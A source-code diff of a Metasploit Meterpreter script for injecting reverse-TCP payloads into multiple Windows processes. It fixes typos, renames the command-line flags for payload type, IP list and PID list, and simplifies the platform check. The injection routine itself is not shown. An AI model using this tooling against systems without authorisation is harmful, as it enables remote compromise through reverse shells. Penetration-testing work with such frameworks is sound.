@@ -1,6 +1,6 @@
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
-# If you'd like to imporve this script, please try to port it as a post
+# If you'd like to improve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
@@ -22,9 +22,9 @@ start_handler = nil
   "-h"  => [ false,  "Help menu." ],
   "-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4444)."],
   "-m"  => [ false,  "Start exploit/multi/handler for return connection."],
-  "-pt" => [ true,   "Specify reverse connection Meterpreter payload. Default: windows/meterpreter/reverse_tcp"],
-  "-mr" => [ true,   "Provide multiple IP addresses for connections separated by comma."],
-  "-mp" => [ true,   "Provide multiple PID for connections separated by comma one per IP."]
+  "-P" => [ true,   "Specify reverse connection Meterpreter payload. Default: windows/meterpreter/reverse_tcp"],
+  "-I" => [ true,   "Provide multiple IP addresses for connections separated by comma."],
+  "-d" => [ true,   "Provide multiple PID for connections separated by comma one per IP."]
 )
 meter_type = client.platform
 
@@ -33,7 +33,7 @@ meter_type = client.platform
 # Usage Message Function
 #-------------------------------------------------------------------------------
 def usage
-  print_line "Meterpreter script for injecting a reverce tcp Meterpreter payload"
+  print_line "Meterpreter script for injecting a reverse tcp Meterpreter payload"
   print_line "in to memory of multiple PIDs. If none is provided, a notepad process"
   print_line "will be created and a Meterpreter payload will be injected in to each."
   print_line(@exec_opts.usage)
@@ -112,17 +112,17 @@ end
     lport = val.to_i
   when "-m"
     start_handler = true
-  when "-pt"
+  when "-P"
     payload_type = val
-  when "-mr"
+  when "-I"
     multi_ip = val.split(",")
-  when "-mp"
+  when "-d"
     multi_pid = val.split(",")
   end
 }
 
 # Check for version of Meterpreter
-wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
+wrong_meter_version(meter_type) if meter_type != 'windows'
 # Create a exploit/multi/handler if desired
 create_multi_handler(payload_type) if start_handler
 
